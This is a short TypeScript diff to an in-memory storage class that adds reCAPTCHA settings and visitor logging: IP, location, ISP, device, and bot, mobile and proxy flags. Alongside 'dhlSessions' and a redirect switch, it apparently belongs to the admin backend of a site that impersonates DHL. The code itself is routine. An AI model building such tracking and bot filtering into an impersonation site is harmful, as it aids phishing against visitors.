@@ -89,6 +89,10 @@ export class MemStorage implements IStorage {
       redirectUrl: settings.redirectUrl ?? null,
       redirectEnabled: settings.redirectEnabled ?? "false",
       adminPasswordHash: settings.adminPasswordHash ?? null,
+      recaptchaSiteKey: settings.recaptchaSiteKey ?? null,
+      recaptchaSecretKey: settings.recaptchaSecretKey ?? null,
+      recaptchaEnabled: settings.recaptchaEnabled ?? "false",
+      recaptchaThreshold: settings.recaptchaThreshold ?? "0.5",
       updatedAt: new Date(),
     };
     this.adminSettings = adminSettings;
@@ -227,6 +231,45 @@ export class MemStorage implements IStorage {
     return Array.from(this.dhlSessions.values()).sort(
       (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
     );
+  }
+
+  async createVisitorLog(log: InsertVisitorLog): Promise<VisitorLog> {
+    const id = randomUUID();
+    const visitorLog: VisitorLog = {
+      id,
+      sessionId: log.sessionId ?? null,
+      flowType: log.flowType,
+      ipAddress: log.ipAddress,
+      country: log.country ?? null,
+      city: log.city ?? null,
+      region: log.region ?? null,
+      isp: log.isp ?? null,
+      userAgent: log.userAgent ?? null,
+      device: log.device ?? null,
+      browser: log.browser ?? null,
+      os: log.os ?? null,
+      language: log.language ?? null,
+      referrer: log.referrer ?? null,
+      currentPage: log.currentPage ?? null,
+      isBot: log.isBot ?? "false",
+      isMobile: log.isMobile ?? "false",
+      isProxy: log.isProxy ?? "false",
+      connectionType: log.connectionType ?? null,
+      createdAt: new Date(),
+    };
+    this.visitorLogs.set(id, visitorLog);
+    return visitorLog;
+  }
+
+  async getAllVisitorLogs(limit: number = 100): Promise<VisitorLog[]> {
+    const logs = Array.from(this.visitorLogs.values()).sort(
+      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
+    );
+    return logs.slice(0, limit);
+  }
+
+  async clearVisitorLogs(): Promise<void> {
+    this.visitorLogs.clear();
   }
 }
 
